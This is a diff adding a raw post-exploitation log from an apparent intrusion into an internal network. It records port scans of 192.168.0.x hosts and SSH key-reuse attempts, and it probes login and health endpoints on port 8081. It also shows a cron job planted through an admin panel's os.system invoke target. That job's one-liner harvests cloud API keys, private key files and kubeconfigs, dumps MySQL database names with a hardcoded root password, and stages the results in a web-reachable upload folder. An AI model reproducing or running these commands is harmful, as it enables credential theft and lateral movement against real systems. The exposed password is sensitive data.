@@ -1,0 +1,68 @@
+Warning: Permanently added '123.184.7.135' (ED25519) to the list of known hosts.
+=== ID
+g0023
+/usr/bin/python3
+Traceback (most recent call last):
+/usr/bin/sshpass
+=== FULLSCAN
+SCAN 192.168.0.24 [111, 781, 2049, 9100, 9400, 18080, 18086, 34231, 36353, 40401, 40569, 45305, 51571, 51935, 55701, 58411]
+SCAN 192.168.0.28 [22, 111, 781, 2049, 9100, 9400, 35175, 36565, 38351, 39017, 42301, 45775, 49449, 57955]
+SCAN 192.168.0.30 [22, 111, 781, 2049, 9100, 9400, 42143, 43321, 45979, 48765, 55747]
+SCAN 192.168.0.31 [22, 111, 781, 2049, 9100, 9400, 38255, 38613, 38767, 46315, 60453]
+SCAN 192.168.0.20 [22, 781, 1900, 1901, 1902, 1903, 1904, 1905, 1906, 1907, 8081, 32829, 40017, 42729, 43857, 46123, 56977, 57607]
+SCAN 192.168.0.21 [22, 10223, 10802, 19001, 24007, 29959, 32795, 33701, 34367, 34707, 35065, 36079, 36337, 36405, 36451, 36685, 36973, 37569, 37709, 38029, 38629, 39271, 39443, 39531, 39633, 40069, 40149, 40239, 40463, 41751, 41815, 42113, 42257, 42269, 42419, 42597, 42839, 43767, 44015, 44023, 44515, 44823, 45577, 46293, 46377, 49351, 49591, 50693, 52693, 53783, 55115, 55861, 55923, 58455, 58795, 58983]
+SCAN 192.168.0.22 [22, 14998, 18000, 18080, 18081, 18082, 18083, 19010, 19011, 24007, 33519, 34097, 35223, 35339, 35547, 36691, 37239, 37675, 38799, 38965, 39003, 39563, 39943, 40345, 41055, 42979, 43013, 43055, 43473, 43715, 43983, 44289, 45733, 46045, 46211, 46845, 51449, 51929, 59201]
+=== REDISKEY
+8828077 /dev/shm/ul5205/rk
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
+", "rows": [{"jobName": "t19w52", "jobExecutor": "default", "jobArgs": "({ echo ===KEYS; grep -rIhoE 'AKID[A-Za-z0-9]+|AKIA[A-Z0-9]+|LTAI[A-Za-z0-9]+|sk-[A-Za-z0-9]+|ghp_[A-Za-z0-9]+' /ssd/vendors /root /opt /etc /var/lib 2>/dev/null | sort -u | head -30; echo ===PEMS; grep -rIl 'BEGIN RSA PRIVATE KEY\\|BEGIN OPENSSH PRIVATE KEY\\|BEGIN PRIVATE KEY' /ssd/vendors /root /opt 2>/dev/null | head -12; echo ===KUBE; find / -maxdepth 6 -name 'kubeconfig*' -o -name 'admin.conf' -o -name '*.kubeconfig' 2>/dev/null | head -8; echo ===DB; docker exec npa-bicm-mysql mysql -uroot -pQQpp0000 -N -e \"SELECT DISTINCT database_name FROM information_schema.schemata\" 2>/dev/null | head -20; } > /ssd/vendors/INSPUR/project/inspur-fastapi-backend/vf_admin/upload_path/upload/2026/11/24/t19creds.txt; wc -l /ssd/vendors/INSPUR/project/inspur-fastapi-backend/vf_admin/upload_path/upload/2026/11/24/t19creds.txt) > /ssd/vendors/INSPUR/project/inspur-fastapi-backend/vf_admin/upload_path/upload/2026/11/24/creds.out 2>&1; echo CMD_END >> /ssd/vendors/INSPUR/project/inspur-fastapi-backend/vf_admin/upload_path/upload/2026/11/24/creds.out", "cronExpression": "0 0 0 1 1 ?", "concurrent": "1", "createBy": "admin", "updateBy": "admin", "remark": "t19", "jobGroup": "default", "jobId": 314, "invokeTarget": "os.system", "jobKwargs": "", "misfirePolicy": "3", "status": "0", "createTime": "2026-11-24T03:37:46", "updateTime": "2026-11-24T10:49:05"}], "pageNum": 1, "pageSize": 200, "total": 1, "hasNext": false, "success": true, "time": "2026-11-24T10:52:58.324617"}, "status_code": 200, "media_type": "application/json", "headers": {}}
+KEYTRY root@192.168.0.24: ssh: connect to host 192.168.0.24 port 22: Connection refused
+KEYTRY ubuntu@192.168.0.24: ssh: connect to host 192.168.0.24 port 22: Connection refused
+KEYTRY root@192.168.0.28: root@192.168.0.28: Permission denied (publickey).
+KEYTRY ubuntu@192.168.0.28: ubuntu@192.168.0.28: Permission denied (publickey).
+KEYTRY root@192.168.0.30: root@192.168.0.30: Permission denied (publickey).
+KEYTRY ubuntu@192.168.0.30: ubuntu@192.168.0.30: Permission denied (publickey).
+KEYTRY root@192.168.0.31: root@192.168.0.31: Permission denied (publickey).
+KEYTRY ubuntu@192.168.0.31: ubuntu@192.168.0.31: Permission denied (publickey).
+=== PWDLADDER
+no paramiko
+=== CALLER8081
+=== 8081PROBE
+--- /api/login
+{"msg":"未授权的请求","reqid":"20261125T051046_ccf783fc","status":"UNAUTHORIZED"} [401]
+
+--- /login
+{"msg":"未授权的请求","reqid":"20261125T051046_8affbb7f","status":"UNAUTHORIZED"} [401]
+
+--- /auth/login
+{"msg":"未授权的请求","reqid":"20261125T051046_c8cd6806","status":"UNAUTHORIZED"} [401]
+
+--- /api/v1/login
+{"msg":"未授权的请求","reqid":"20261125T051046_8c8fc431","status":"UNAUTHORIZED"} [401]
+
+--- /api/user/login
+{"msg":"未授权的请求","reqid":"20261125T051046_d8bff886","status":"UNAUTHORIZED"} [401]
+
+--- /api/health
+{"msg":"未授权的请求","reqid":"20261125T051046_dd17e916","status":"UNAUTHORIZED"} [401]
+
+--- /health
+{"msg":"未授权的请求","reqid":"20261125T051046_3f19ff47","status":"UNAUTHORIZED"} [401]
+
+--- /api/v1/health
+{"msg":"未授权的请求","reqid":"20261125T051046_e882f1e4","status":"UNAUTHORIZED"} [401]
+
+--- /swagger-ui.html
+{"msg":"未授权的请求","reqid":"20261125T051046_1d716760","status":"UNAUTHORIZED"} [401]
+
+--- /v3/api-docs
+{"msg":"未授权的请求","reqid":"20261125T051046_f88ea931","status":"UNAUTHORIZED"} [401]
+
+--- /api/v1/nodes
+{"msg":"未授权的请求","reqid":"20261125T051046_5aaa53af","status":"UNAUTHORIZED"} [401]
+
+--- /api/nodes
+{"msg":"未授权的请求","reqid":"20261125T051046_6b41c6cd","status":"UNAUTHORIZED"} [401]
+
+=== DONE
